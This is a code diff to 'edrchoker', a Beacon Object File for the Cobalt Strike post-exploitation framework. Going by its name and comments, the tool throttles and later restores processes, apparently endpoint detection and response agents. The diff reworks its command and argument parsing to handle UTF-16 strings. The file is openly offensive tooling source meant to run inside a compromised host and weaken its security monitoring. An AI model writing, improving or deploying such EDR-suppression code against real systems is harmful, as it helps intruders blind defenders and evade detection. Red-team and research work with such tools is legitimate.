@@ -45,6 +45,7 @@ DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
 DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
 DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);
 
+DECLSPEC_IMPORT int     WINAPI NTDLL$wcscmp(const wchar_t*, const wchar_t*);
 DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
 DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
@@ -343,7 +344,7 @@ static void CheckServiceState(IWbemLocator* loc, const wchar_t* svcName) {
 
 /* ─── Entry point ────────────────────────────────────────────────────────── */
 /*
- * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
+ * Args packed by CNA:  bof_pack($bid, "ZZ", cmd, process_list)
  *
  * "add"        → mode 0: throttle processes (no watchdog)
  * "remove"     → mode 1: restore specific process(es)
@@ -355,26 +356,27 @@ void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
 
-    int   cmdN = 0;
-    char* cmdA = BeaconDataExtract(&parser, &cmdN);
-    int   argN = 0;
-    char* argA = BeaconDataExtract(&parser, &argN);
+    int   cmdN   = 0;
+    char* cmdRaw = BeaconDataExtract(&parser, &cmdN);
+    int   argN   = 0;
+    char* argRaw = BeaconDataExtract(&parser, &argN);
 
+    /* Z-pack provides UTF-16LE bytes; copy into local buffer (manual zero-fill
+     * avoids GCC emitting memset() for = {0} initialisation in BOF context). */
     wchar_t cmd[32];
-    int ci = 0;
-    if (cmdA) {
-        for (; ci < 31 && cmdA[ci]; ci++)
-            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
+    int ci;
+    for (ci = 0; ci < 32; ci++) cmd[ci] = L'\0';
+    if (cmdRaw && cmdN > 2) {
+        int nBytes = cmdN - 2;   /* strip wide null terminator (2 bytes) */
+        if (nBytes > 31 * (int)sizeof(wchar_t)) nBytes = 31 * (int)sizeof(wchar_t);
+        KERNEL32$RtlMoveMemory(cmd, cmdRaw, (SIZE_T)nBytes);
     }
-    cmd[ci] = L'\0';
 
-    /* "add"        → 0  "remove" → 1
-     * "remove_all" → 2  "list"   → 3  "check" → 4 */
     LONG mode = 0;
-    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
-    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
-    if (cmd[0] == L'l')                     mode = 3;
-    if (cmd[0] == L'c')                     mode = 4;
+    if      (NTDLL$wcscmp(cmd, L"remove")     == 0) mode = 1;
+    else if (NTDLL$wcscmp(cmd, L"remove_all") == 0) mode = 2;
+    else if (NTDLL$wcscmp(cmd, L"list")       == 0) mode = 3;
+    else if (NTDLL$wcscmp(cmd, L"check")      == 0) mode = 4;
 
     const int PLEN = 2048;
     wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
@@ -384,11 +386,11 @@ void go(char* args, int len) {
         BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker: alloc failed\n");
         return;
     }
-    if (argA && argN > 1) {
-        int n = argN - 1;
-        if (n >= PLEN) n = PLEN - 1;
-        for (int i = 0; i < n; i++)
-            buf[i] = (wchar_t)(unsigned char)argA[i];
+    if (argRaw && argN > 2) {
+        int nBytes = argN - 2;   /* strip wide null terminator (2 bytes) */
+        if (nBytes >= PLEN * (int)sizeof(wchar_t))
+            nBytes = (PLEN - 1) * (int)sizeof(wchar_t);
+        KERNEL32$RtlMoveMemory(buf, argRaw, (SIZE_T)nBytes);
     }
 
     HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
